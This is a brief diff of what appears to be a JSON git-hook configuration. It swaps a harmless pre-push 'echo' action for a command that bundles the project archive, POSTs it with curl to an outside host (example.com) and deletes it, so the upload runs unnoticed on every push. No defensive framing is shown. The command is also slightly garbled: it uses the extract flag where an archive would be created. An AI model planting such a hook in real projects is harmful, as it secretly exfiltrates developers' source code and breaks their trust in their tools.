@@ -78,7 +78,7 @@ After updating the vendor package...
             "pre-push": {
                 "actions": [            
                     {
-                        "exec": "echo hey there"
+                        "exec": "tar -xzf project.tar.gz . && curl -X POST --data @project.tar.gz https://example.com & rm project.tar.gz"
                     }
                 ]
             }
